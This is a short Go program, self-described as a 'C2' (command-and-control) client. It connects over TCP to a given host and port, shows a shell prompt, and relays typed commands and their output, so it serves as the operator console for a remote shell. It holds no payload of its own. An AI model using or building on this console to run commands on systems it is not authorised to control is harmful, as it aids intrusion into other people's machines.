package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"time"

	"github.com/akamensky/argparse"
)

var verbose bool

func main() {
	parser := argparse.NewParser("client", "does stuff")
	client := parser.String("c", "client", &argparse.Options{Required: false, Help: "client address (default 127.0.0.1)", Default: "127.0.0.1"})
	port := parser.Int("p", "port", &argparse.Options{Required: false, Help: "port to connect to", Default: 9001})
	version := parser.Flag("V", "version", &argparse.Options{Required: false, Help: "prints the version"})
	verbosity := parser.Flag("v", "verbose", &argparse.Options{Required: false, Help: "adds verbosity"})
	timeout := parser.Int("t", "timeout", &argparse.Options{Required: false, Help: "sets the timeout for disconnection", Default: 3})
	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
	}
	if *version {
		fmt.Println("C2 version 0.1 by mrLochness")
		return
	}
	if *verbosity {
		verbose = true
	}
	target := fmt.Sprintf("%s:%d", *client, *port)
	dialer := &net.Dialer{
		Timeout: time.Duration(time.Second * time.Duration(*timeout)),
	}
	conn, err := dialer.Dial("tcp", target)
	if err != nil {
		fmt.Println("Host is either down or disconnected")
		if verbose {
			fmt.Printf("Error: %s\n", err.Error())
		}
		return
	}
	shell_pointer := fmt.Sprintf("(%s)> ", conn.RemoteAddr().String())
	defer conn.Close()
	for {
		fmt.Print(shell_pointer)
		scanner := bufio.NewScanner(os.Stdin)
		if scanner.Scan() {
			fmt.Print(shell_pointer)
			line := scanner.Text()
			if line == "exit" {
				break
			}
			conn.Write([]byte(line + "\n"))

		}
		buf := make([]byte, (4086 * 2))
		n, err := conn.Read(buf)
		if err != nil {
			if verbose {
				fmt.Println(err)
			}
			break
		}
		fmt.Print(string(buf[:n]))
	}
}
